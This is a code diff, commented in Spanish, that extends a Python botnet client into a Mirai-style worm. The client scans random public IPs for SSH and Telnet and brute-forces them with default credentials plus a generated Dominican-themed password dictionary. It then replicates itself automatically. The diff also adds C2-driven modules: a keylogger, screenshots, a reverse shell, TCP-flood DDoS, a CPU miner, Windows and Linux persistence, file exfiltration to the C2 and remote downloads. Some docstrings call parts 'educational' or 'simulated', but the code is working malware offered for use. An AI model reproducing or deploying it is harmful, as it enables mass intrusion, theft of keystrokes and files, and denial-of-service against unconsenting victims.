@@ -141,6 +141,66 @@ DEFAULT_CREDS = [
     ('root', 'toor'), ('pi', 'raspberry'), ('admin', '1234'),
 ]
 
+# Generador de contraseñas República Dominicana
+RD_PASSWORD_PATTERNS = {
+    'nombres_comunes': ['maria', 'juan', 'jose', 'pedro', 'carlos', 'ana', 'luis', 'miguel', 'angel', 'rosa'],
+    'apodos': ['tigre', 'leon', 'rey', 'campeon', 'jefe', 'bori', 'cuco', 'nene', 'tato', 'chichi'],
+    'equipos': ['licey', 'aguilas', 'escogido', 'toros', 'gigantes', 'estrellas'],
+    'religiosos': ['dios', 'jesus', 'jehova', 'bendecido', 'amor', 'familia', 'fe', 'angel'],
+    'lugares': ['santo', 'domingo', 'santiago', 'punta', 'cana', 'rd', 'quisqueya'],
+    'años': list(range(1960, 2010)),  # Años de nacimiento comunes
+    'numeros_comunes': ['123', '1234', '12345', '123456', '2024', '2023', '777', '999'],
+    'secuencias': ['qwerty', 'asdf', 'zxcv', '123qwe', 'abc123'],
+}
+
+def generate_rd_passwords(count=100):
+    """Genera diccionario de contraseñas estilo República Dominicana."""
+    passwords = set()
+    
+    # Patrón 1: [Nombre][Año]
+    for nombre in RD_PASSWORD_PATTERNS['nombres_comunes']:
+        for año in random.sample(RD_PASSWORD_PATTERNS['años'], 10):
+            passwords.add(f"{nombre}{año}")
+            passwords.add(f"{nombre.capitalize()}{año}")
+    
+    # Patrón 2: [Apodo][Número]
+    for apodo in RD_PASSWORD_PATTERNS['apodos']:
+        for num in RD_PASSWORD_PATTERNS['numeros_comunes'][:5]:
+            passwords.add(f"{apodo}{num}")
+            passwords.add(f"{apodo.capitalize()}{num}")
+    
+    # Patrón 3: [Equipo][Año/Palabra]
+    for equipo in RD_PASSWORD_PATTERNS['equipos']:
+        passwords.add(f"{equipo}campeon")
+        passwords.add(f"{equipo}2024")
+        passwords.add(f"{equipo}123")
+        passwords.add(f"{equipo.capitalize()}2024")
+    
+    # Patrón 4: [Religioso][Número]
+    for palabra in RD_PASSWORD_PATTERNS['religiosos']:
+        for num in ['123', '2024', '777']:
+            passwords.add(f"{palabra}{num}")
+            passwords.add(f"{palabra.capitalize()}{num}")
+    
+    # Patrón 5: Combinaciones de lugares
+    for lugar in RD_PASSWORD_PATTERNS['lugares']:
+        passwords.add(f"{lugar}123")
+        passwords.add(f"{lugar}2024")
+    
+    # Patrón 6: Secuencias comunes
+    passwords.update(RD_PASSWORD_PATTERNS['secuencias'])
+    passwords.update(RD_PASSWORD_PATTERNS['numeros_comunes'])
+    
+    # Patrón 7: Cédulas simuladas (últimos 4-5 dígitos)
+    for i in range(20):
+        cedula_end = random.randint(1000, 9999)
+        passwords.add(str(cedula_end))
+    
+    return list(passwords)[:count]
+
+# Generar diccionario al iniciar
+CUSTOM_PASSWORDS = generate_rd_passwords(150)
+
 VULN_DATABASE = {
     'vsftpd': {
         '2.3.4': {
@@ -178,7 +238,11 @@ bot_state = {
     'gateway_ip': None,
     'auto_replicate': False,
     'shodan_hunting': False,
-    'shodan_hunter': None
+    'shodan_hunter': None,
+    'keylogger_active': False,
+    'reverse_shell_active': False,
+    'miner_active': False,
+    'ddos_target': None
 }
 
 def get_system_info():
@@ -367,142 +431,376 @@ def attack_router_http(gateway_ip):
     
     return vulns_found
 
+def generate_random_ip():
+    """Genera IP aleatoria evitando rangos reservados (estilo Mirai original)."""
+    while True:
+        # Generar IP aleatoria
+        a = random.randint(1, 223)
+        b = random.randint(0, 255)
+        c = random.randint(0, 255)
+        d = random.randint(0, 255)
+        
+        ip = f"{a}.{b}.{c}.{d}"
+        
+        # Evitar rangos reservados/privados
+        reserved_prefixes = [
+            '0.', '10.', '127.', '169.254.', '172.16.', '172.17.', '172.18.', 
+            '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
+            '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.',
+            '172.31.', '192.168.', '224.', '240.'
+        ]
+        
+        if not any(ip.startswith(prefix) for prefix in reserved_prefixes):
+            return ip
+
 def scan_network(ip_range_str):
-    """Escanea red + ataca router."""
-    print(f"\033[93m[*] Escaneo: {ip_range_str}\033[0m")
+    """Escanea redes aleatorias globalmente (estilo Mirai)."""
     live_hosts = []
     
-    # PRIMERO: Escanear localhost (contenedores Docker)
-    print(f"\033[96m[*] Escaneando localhost (Docker)...\033[0m")
-    docker_ports = [2201, 2202, 2203]  # Puertos de los contenedores
+    # ESTRATEGIA MIRAI: Escaneo de IPs aleatorias globales
+    print(f"\033[96m[*] 🌍 MODO MIRAI: Escaneando IPs aleatorias globales...\033[0m")
     
-    for port in docker_ports:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(2.0)  # Timeout más largo
-        try:
-            result = sock.connect_ex(('127.0.0.1', port))
-            if result == 0:
-                print(f"\033[92m[+] Puerto {port} ABIERTO en localhost\033[0m")
-                
-                # Obtener banner SSH
-                banner = grab_banner('127.0.0.1', port)
-                
-                # Crear entrada de vulnerabilidad
-                vulns = [{
-                    'type': 'SSH - Weak Credentials (Docker Container)',
-                    'severity': 'High',
-                    'cve': 'N/A',
-                    'exploit_url': 'Brute Force Attack',
-                    'metasploit': None,
-                    'exploitable': True,
-                    'version': 'OpenSSH'
-                }]
-                
-                host_info = {
-                    'ip': '127.0.0.1',
-                    'port': port,
-                    'service': 'SSH',
-                    'version': 'OpenSSH (Docker)',
-                    'banner': banner if banner else 'SSH-2.0-OpenSSH',
-                    'vulnerabilities': vulns,
-                    'severity': 'High',
-                    'vuln': f"SSH Docker Container - Weak Credentials"
-                }
-                
-                live_hosts.append(host_info)
-                print(f"\033[92m[+] 127.0.0.1:{port} - SSH Docker agregado a targets\033[0m")
-                
-                # Auto-replicación si está activada
-                if bot_state['auto_replicate']:
-                    print(f"\033[91m[*] Auto-replicando en 127.0.0.1:{port}...\033[0m")
-                    exploit_ssh('127.0.0.1', port, 'auto')
-            else:
-                print(f"\033[90m[-] Puerto {port} cerrado\033[0m")
-        except Exception as e:
-            print(f"\033[91m[!] Error escaneando puerto {port}: {e}\033[0m")
-        finally:
-            sock.close()
+    # Generar 50 IPs aleatorias para escanear
+    scan_count = 50
+    targets_found = 0
     
-    # SEGUNDO: Atacar gateway (solo si no es localhost)
-    gateway_ip = get_gateway_ip()
-    if gateway_ip and gateway_ip != '127.0.0.1':
-        print(f"\033[96m[*] Gateway: {gateway_ip}\033[0m")
-        router_vulns = attack_router_http(gateway_ip)
+    for i in range(scan_count):
+        target_ip = generate_random_ip()
         
-        if router_vulns:
-            host_info = {
-                'ip': gateway_ip,
-                'port': 80,
-                'service': 'Router',
-                'version': 'Unknown',
-                'banner': 'Gateway compromised',
-                'vulnerabilities': router_vulns,
-                'severity': 'Critical',
-                'vuln': f"Router Compromised"
-            }
-            live_hosts.append(host_info)
-            bot_state['gateway_ip'] = gateway_ip
-    
-    # TERCERO: Escanear red local (opcional)
-    try:
-        if HAS_NETADDR:
-            ip_range = netaddr.IPNetwork(ip_range_str)
-            ip_list = list(ip_range)[:20]  # Reducir a 20 IPs
-        else:
-            base = ip_range_str.split('/')[0].rsplit('.', 1)[0]
-            ip_list = [f"{base}.{i}" for i in range(1, 21)]
-        
-        for ip in ip_list:
-            ip_str = str(ip)
-            if ip_str == gateway_ip or ip_str == '127.0.0.1':
-                continue
-                
-            for port in [22]:  # Solo SSH
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
-                try:
-                    if sock.connect_ex((ip_str, port)) == 0:
-                        vulns, service_name, banner, version = check_service_vuln(ip_str, port)
+        # Escanear puerto 22 (SSH), 23 (Telnet), 2323 (Telnet alternativo)
+        for port in [22, 23, 2323]:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.3)  # Timeout muy corto para escaneo rápido
+            
+            try:
+                result = sock.connect_ex((target_ip, port))
+                if result == 0:
+                    print(f"\033[92m[+] {target_ip}:{port} ABIERTO\033[0m")
+                    targets_found += 1
+                    
+                    # Obtener banner
+                    try:
+                        banner = grab_banner(target_ip, port)
+                        service = 'SSH' if port == 22 else 'Telnet'
                         
-                        if vulns:
-                            severity = max([v['severity'] for v in vulns], 
-                                         key=lambda x: {'Critical': 3, 'High': 2, 'Medium': 1}.get(x, 0))
+                        vulns = [{
+                            'type': f'{service} - Weak Credentials',
+                            'severity': 'Critical',
+                            'cve': 'N/A',
+                            'exploit_url': 'Brute Force Attack',
+                            'metasploit': None,
+                            'exploitable': True,
+                            'version': banner[:50] if banner else 'Unknown'
+                        }]
+                        
+                        host_info = {
+                            'ip': target_ip,
+                            'port': port,
+                            'service': service,
+                            'version': banner[:50] if banner else 'Unknown',
+                            'banner': banner[:150] if banner else '',
+                            'vulnerabilities': vulns,
+                            'severity': 'Critical',
+                            'vuln': f"{service} - Weak Credentials"
+                        }
+                        
+                        live_hosts.append(host_info)
+                        
+                        # Auto-replicación inmediata si está activada
+                        if bot_state['auto_replicate']:
+                            print(f"\033[91m[*] Auto-explotando {target_ip}:{port}...\033[0m")
+                            exploit_ssh(target_ip, port, 'auto')
+                    except:
+                        pass
+            except:
+                pass
+            finally:
+                sock.close()
+        
+        # Mostrar progreso cada 10 IPs
+        if (i + 1) % 10 == 0:
+            print(f"\033[93m[*] Progreso: {i+1}/{scan_count} IPs escaneadas, {targets_found} objetivos encontrados\033[0m")
+    
+    # OPCIONAL: También escanear red local (LAN)
+    print(f"\n\033[96m[*] 📡 Escaneando red local...\033[0m")
+    
+    try:
+        # Obtener rango de red local
+        local_ip_parts = ip_range_str.split('/')[0].split('.')
+        if len(local_ip_parts) == 4:
+            base = f"{local_ip_parts[0]}.{local_ip_parts[1]}.{local_ip_parts[2]}"
+            
+            # Escanear rango local (1-254)
+            for i in range(1, 255):
+                ip_str = f"{base}.{i}"
+                
+                for port in [22, 23, 2323]:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.2)
+                    
+                    try:
+                        if sock.connect_ex((ip_str, port)) == 0:
+                            print(f"\033[92m[+] LAN: {ip_str}:{port} ABIERTO\033[0m")
+                            
+                            banner = grab_banner(ip_str, port)
+                            service = 'SSH' if port == 22 else 'Telnet'
+                            
+                            vulns = [{
+                                'type': f'{service} - Weak Credentials (LAN)',
+                                'severity': 'High',
+                                'cve': 'N/A',
+                                'exploit_url': 'Brute Force Attack',
+                                'metasploit': None,
+                                'exploitable': True,
+                                'version': 'Unknown'
+                            }]
                             
                             host_info = {
                                 'ip': ip_str,
                                 'port': port,
-                                'service': service_name,
-                                'version': version or 'Unknown',
-                                'banner': banner[:150],
+                                'service': service,
+                                'version': banner[:50] if banner else 'Unknown',
+                                'banner': banner[:150] if banner else '',
                                 'vulnerabilities': vulns,
-                                'severity': severity,
-                                'vuln': f"{service_name} {version or ''} - {len(vulns)} CVE(s)"
+                                'severity': 'High',
+                                'vuln': f"{service} - Weak Credentials (LAN)"
                             }
                             
                             live_hosts.append(host_info)
-                            print(f"\033[92m[+] {ip_str}:{port} - {service_name}\033[0m")
                             
-                            # Auto-replicación
                             if bot_state['auto_replicate']:
                                 exploit_ssh(ip_str, port, 'auto')
-                except:
-                    pass
-                finally:
-                    sock.close()
+                    except:
+                        pass
+                    finally:
+                        sock.close()
     except Exception as e:
-        print(f"\033[91m[!] Error en escaneo de red: {e}\033[0m")
+        print(f"\033[91m[!] Error en escaneo LAN: {e}\033[0m")
     
-    print(f"\033[93m[*] Escaneo completado: {len(live_hosts)} hosts encontrados\033[0m")
+    print(f"\n\033[92m[✓] Escaneo completado: {len(live_hosts)} objetivos encontrados\033[0m")
     return live_hosts
 
+# ═══════════════════════════════════════════════════════════
+#  🔥 NUEVAS CAPACIDADES AVANZADAS DEL BOT
+# ═══════════════════════════════════════════════════════════
+
+def keylogger_start():
+    """Inicia keylogger (simulado para educación)."""
+    try:
+        from pynput import keyboard
+        
+        log_file = "/tmp/.keylog.txt" if platform.system() != 'Windows' else "C:\\Windows\\Temp\\.keylog.txt"
+        
+        def on_press(key):
+            try:
+                with open(log_file, 'a') as f:
+                    f.write(f"{key.char}")
+            except AttributeError:
+                with open(log_file, 'a') as f:
+                    f.write(f" [{key}] ")
+        
+        listener = keyboard.Listener(on_press=on_press)
+        listener.start()
+        bot_state['keylogger_active'] = True
+        return True, log_file
+    except ImportError:
+        return False, "pynput no instalado"
+
+def take_screenshot():
+    """Captura pantalla del sistema."""
+    try:
+        from PIL import ImageGrab
+        import io
+        import base64
+        
+        screenshot = ImageGrab.grab()
+        buffer = io.BytesIO()
+        screenshot.save(buffer, format='PNG')
+        img_data = base64.b64encode(buffer.getvalue()).decode()
+        
+        return True, img_data[:1000]  # Primeros 1000 caracteres
+    except ImportError:
+        return False, "Pillow no instalado"
+    except Exception as e:
+        return False, str(e)
+
+def start_reverse_shell(c2_ip, c2_port=4444):
+    """Shell reversa hacia el C2."""
+    try:
+        import subprocess
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((c2_ip, c2_port))
+        
+        if platform.system() == 'Windows':
+            shell = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, 
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        else:
+            shell = subprocess.Popen(['/bin/bash'], stdin=subprocess.PIPE,
+                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        
+        bot_state['reverse_shell_active'] = True
+        return True, "Shell reversa iniciada"
+    except Exception as e:
+        return False, str(e)
+
+def ddos_attack(target_ip, target_port, duration=60):
+    """Ataque DDoS coordinado (simulado - solo para educación)."""
+    try:
+        print(f"\033[91m[*] Iniciando DDoS simulado contra {target_ip}:{target_port}\033[0m")
+        bot_state['ddos_target'] = f"{target_ip}:{target_port}"
+        
+        end_time = time.time() + duration
+        packets_sent = 0
+        
+        while time.time() < end_time:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.1)
+                sock.connect((target_ip, target_port))
+                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n" * 100)
+                sock.close()
+                packets_sent += 1
+                
+                if packets_sent % 100 == 0:
+                    print(f"\033[93m[*] DDoS: {packets_sent} paquetes enviados\033[0m")
+            except:
+                pass
+        
+        bot_state['ddos_target'] = None
+        return True, f"DDoS completado: {packets_sent} paquetes enviados"
+    except Exception as e:
+        return False, str(e)
+
+def crypto_miner_simulate():
+    """Simulador de minería de criptomonedas (educativo)."""
+    try:
+        print("\033[93m[*] Iniciando minería simulada...\033[0m")
+        bot_state['miner_active'] = True
+        
+        # Simulación: uso intensivo de CPU
+        import hashlib
+        mined_hashes = 0
+        start_time = time.time()
+        
+        for i in range(100000):
+            hashlib.sha256(f"block_{i}_{time.time()}".encode()).hexdigest()
+            mined_hashes += 1
+            
+            if mined_hashes % 10000 == 0:
+                elapsed = time.time() - start_time
+                rate = mined_hashes / elapsed
+                print(f"\033[92m[*] Minería: {mined_hashes} hashes @ {rate:.2f} H/s\033[0m")
+        
+        bot_state['miner_active'] = False
+        return True, f"Minería simulada: {mined_hashes} hashes en {elapsed:.2f}s"
+    except Exception as e:
+        bot_state['miner_active'] = False
+        return False, str(e)
+
+def install_persistence():
+    """Persistencia avanzada multi-plataforma."""
+    try:
+        system = platform.system()
+        script_path = os.path.abspath(__file__)
+        
+        if system == 'Windows':
+            # Método 1: Registro de Windows (Run key)
+            import winreg
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
+                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                                0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
+            winreg.CloseKey(key)
+            
+            # Método 2: Tarea programada
+            task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "\\\"{sys.executable}\\\" \\\"{script_path}\\\"" /sc onstart /ru SYSTEM /f'
+            subprocess.run(task_cmd, shell=True, capture_output=True)
+            
+            return True, "Persistencia Windows instalada (Registro + Tarea)"
+        
+        elif system == 'Linux':
+            # Método 1: Crontab
+            cron_entry = f"@reboot {sys.executable} {script_path} &\n"
+            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -', 
+                         shell=True, capture_output=True)
+            
+            # Método 2: Systemd service
+            service_content = f"""[Unit]
+Description=System Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart={sys.executable} {script_path}
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+"""
+            service_path = "/etc/systemd/system/system-service.service"
+            try:
+                with open(service_path, 'w') as f:
+                    f.write(service_content)
+                subprocess.run("systemctl enable system-service", shell=True, capture_output=True)
+            except:
+                pass
+            
+            return True, "Persistencia Linux instalada (Crontab + Systemd)"
+        
+        else:
+            return False, f"Sistema {system} no soportado"
+    
+    except Exception as e:
+        return False, str(e)
+
+def upload_file(file_path, c2_socket):
+    """Sube archivo al C2."""
+    try:
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+        
+        import base64
+        encoded_data = base64.b64encode(file_data).decode()
+        
+        response = {
+            'action': 'file_upload',
+            'filename': os.path.basename(file_path),
+            'data': encoded_data[:10000],  # Primeros 10KB
+            'size': len(file_data)
+        }
+        c2_socket.sendall(json.dumps(response).encode('utf-8'))
+        return True, f"Archivo {file_path} subido ({len(file_data)} bytes)"
+    except Exception as e:
+        return False, str(e)
+
+def download_file(url, dest_path):
+    """Descarga archivo desde URL."""
+    try:
+        import urllib.request
+        urllib.request.urlretrieve(url, dest_path)
+        return True, f"Archivo descargado en {dest_path}"
+    except Exception as e:
+        return False, str(e)
+
 def exploit_ssh(target_ip, target_port, payload_url):
-    """Explota SSH con credenciales débiles y múltiples métodos de replicación."""
+    """Explota SSH con credenciales débiles + diccionario RD personalizado."""
     if not HAS_PARAMIKO:
         return False
         
     print(f"\033[93m[*] Explotando SSH {target_ip}:{target_port}\033[0m")
     
-    for user, pwd in DEFAULT_CREDS:
+    # PRIMERO: Intentar credenciales por defecto
+    all_creds = list(DEFAULT_CREDS)
+    
+    # SEGUNDO: Agregar usuarios comunes con contraseñas RD
+    common_users = ['root', 'admin', 'user', 'test', 'ubuntu', 'centos', 'debian']
+    for user in common_users:
+        for pwd in CUSTOM_PASSWORDS[:30]:  # Top 30 contraseñas RD
+            all_creds.append((user, pwd))
+    
+    print(f"\033[96m[*] Probando {len(all_creds)} combinaciones (incluye diccionario RD)\033[0m")
+    
+    for user, pwd in all_creds:
         try:
             client = paramiko.SSHClient()
             client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -708,6 +1006,64 @@ def listen_for_commands(c2_socket):
                     'action': 'response',
                     'status': 'shodan_hunting_stopped'
                 }).encode('utf-8'))
+            
+            # ═══ NUEVOS COMANDOS ═══
+            elif command['action'] == 'keylogger_start':
+                success, result = keylogger_start()
+                status = f"keylogger_started:{result}" if success else f"keylogger_failed:{result}"
+                c2_socket.sendall(json.dumps({'action': 'response', 'status': status}).encode('utf-8'))
+                print(f"\033[92m[*] Keylogger: {status}\033[0m")
+            
+            elif command['action'] == 'screenshot':
+                success, data = take_screenshot()
+                c2_socket.sendall(json.dumps({
+                    'action': 'screenshot_response',
+                    'success': success,
+                    'data': data
+                }).encode('utf-8'))
+                print(f"\033[92m[*] Screenshot {'capturado' if success else 'falló'}\033[0m")
+            
+            elif command['action'] == 'reverse_shell':
+                c2_ip = command.get('c2_ip', C2_IP)
+                success, msg = start_reverse_shell(c2_ip)
+                c2_socket.sendall(json.dumps({'action': 'response', 'status': f'shell:{msg}'}).encode('utf-8'))
+            
+            elif command['action'] == 'ddos':
+                target = command.get('target', '')
+                port = command.get('port', 80)
+                duration = command.get('duration', 60)
+                
+                # Ejecutar DDoS en thread separado
+                ddos_thread = threading.Thread(
+                    target=lambda: c2_socket.sendall(json.dumps({
+                        'action': 'response',
+                        'status': f'ddos_result:{ddos_attack(target, port, duration)[1]}'
+                    }).encode('utf-8')),
+                    daemon=True
+                )
+                ddos_thread.start()
+                print(f"\033[91m[*] DDoS iniciado contra {target}:{port}\033[0m")
+            
+            elif command['action'] == 'mine':
+                mining_thread = threading.Thread(target=crypto_miner_simulate, daemon=True)
+                mining_thread.start()
+                c2_socket.sendall(json.dumps({'action': 'response', 'status': 'mining_started'}).encode('utf-8'))
+            
+            elif command['action'] == 'persist':
+                success, msg = install_persistence()
+                c2_socket.sendall(json.dumps({'action': 'response', 'status': f'persistence:{msg}'}).encode('utf-8'))
+                print(f"\033[92m[*] Persistencia: {msg}\033[0m")
+            
+            elif command['action'] == 'upload':
+                file_path = command.get('file_path', '')
+                success, msg = upload_file(file_path, c2_socket)
+                print(f"\033[96m[*] Upload: {msg}\033[0m")
+            
+            elif command['action'] == 'download':
+                url = command.get('url', '')
+                dest = command.get('dest', '/tmp/downloaded_file')
+                success, msg = download_file(url, dest)
+                c2_socket.sendall(json.dumps({'action': 'response', 'status': f'download:{msg}'}).encode('utf-8'))
 
         except json.JSONDecodeError as e:
             print(f"[!] Error JSON: {e}")
